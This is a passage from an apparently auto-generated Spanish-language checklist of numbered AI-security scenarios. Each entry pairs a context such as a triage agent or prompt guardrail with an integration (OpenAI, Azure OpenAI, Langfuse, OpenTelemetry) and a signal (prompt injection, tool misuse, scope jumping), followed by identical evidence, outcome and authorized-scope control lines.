- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 22
- Contexto: agente de triage.
- Integracion recomendada: Azure OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 23
- Contexto: guardrail de prompts.
- Integracion recomendada: Langfuse.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 24
- Contexto: generacion de evidencia.
- Integracion recomendada: OpenTelemetry.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 25
- Contexto: agente de triage.
- Integracion recomendada: OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 26
- Contexto: guardrail de prompts.
- Integracion recomendada: Azure OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 27
- Contexto: generacion de evidencia.
- Integracion recomendada: Langfuse.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 28
- Contexto: agente de triage.
- Integracion recomendada: OpenTelemetry.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 29
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 30
- Contexto: generacion de evidencia.
- Integracion recomendada: Azure OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 31
- Contexto: agente de triage.
- Integracion recomendada: Langfuse.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 32
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenTelemetry.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 33
- Contexto: generacion de evidencia.
- Integracion recomendada: OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 34
- Contexto: agente de triage.
- Integracion recomendada: Azure OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 35
- Contexto: guardrail de prompts.
- Integracion recomendada: Langfuse.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 36
- Contexto: generacion de evidencia.
- Integracion recomendada: OpenTelemetry.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 37
- Contexto: agente de triage.
- Integracion recomendada: OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 38
- Contexto: guardrail de prompts.
- Integracion recomendada: Azure OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 39
- Contexto: generacion de evidencia.
- Integracion recomendada: Langfuse.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 40
- Contexto: agente de triage.
- Integracion recomendada: OpenTelemetry.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 41
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 42
- Contexto: generacion de evidencia.
- Integracion recomendada: Azure OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 43
- Contexto: agente de triage.
- Integracion recomendada: Langfuse.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 44
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenTelemetry.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

